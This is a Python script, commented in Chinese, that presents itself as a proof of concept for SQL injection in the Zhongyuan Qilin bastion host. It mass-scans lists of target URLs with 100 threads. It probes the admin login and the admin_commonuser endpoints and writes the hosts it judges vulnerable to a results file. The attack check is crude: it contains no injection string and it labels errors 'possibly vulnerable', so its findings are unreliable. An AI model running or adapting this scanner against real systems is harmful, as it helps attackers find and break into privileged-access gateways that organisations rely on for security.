import requests,argparse,sys   # 导入模块
from multiprocessing.dummy import Pool  # 导入线程池处理多线程
requests.packages.urllib3.disable_warnings() # 关闭警告
def banner():
    test = """中远麒麟堡垒机SQL注入"""
    print(test)  # 打印"""中远麒麟堡垒机SQL注入"""

def main():
    banner() # 调用横幅函数
    parse = argparse.ArgumentParser(description="中远麒麟堡垒机SQL注入漏洞") # 创建解析器处理命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='Please enter url') # 添加运行url参数
    parse.add_argument('-f','--file',dest='file',type=str,help='Please enter file') # 添加运行文件参数
    args = parse.parse_args() # 解析命令行参数
    if args.url and not args.file: # 如果指定url,没有指定文件
        poc(args.url) # 调用poc函数检测指定的url
    elif args.file and not args.url: # 如果指定文件,没有指定url
        url_list = [] # 创建一个url列表存储读取的url
        with open(args.file,'r',encoding='utf-8') as f: # 读取文件中的url
            for url in f.readlines():
                url_list.append(url.strip().replace('\n','')) # 替换换行符为空,并添加到列表
            mp = Pool(100) # 创建一个线程池为100
            mp.map(poc,url_list) # 将任务分发到线程池中
            mp.close() # 关闭线程池,不再接受新任务
            mp.join() # 等待所有线程完成
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
def poc(target): # 定义poc函数
    payload1 = '/admin.php?controller=admin_index&action=login' # 生成payload
    payload2 = '/admin.php?controller=admin_commonuser'   # 生成payload
    headers = {
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }    # 请求体
    try: # 测试输入的url是否在漏洞条件
        res1 = requests.get(url=target+payload1, verify=False, timeout=5) # 发送get请求到目标rul,关闭证书
        if res1.status_code == 200: # 检查目标URL是否返回200，即请求成功
            res2 = requests.post(url=target+payload2, headers=headers, verify=False,timeout=5) # 发送post请求到目标rul,关闭证书
            if res2.status_code == 200 and "result" in res2.text:  # 检查目标URL是否返回200，并且若"result"在结果里即请求成功
                print(f"[+]{target}存在sql注入漏洞")  # 若存在,输出结果,表示存在漏洞
                with open("中qilin_result.txt","a",encoding='utf-8') as f:  # 打开用于存储结果的文件,并追加写入结果
                    f.write(f"{target}存在sql注入漏洞\n")
            else:
                print(f"[-]{target}不存在sql注入漏洞")  # 若不存在输出目标url不存在漏洞
    except Exception as e:  # 捕获异常，提示可能的问题
        print(f"{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__': # 程序入口
    main()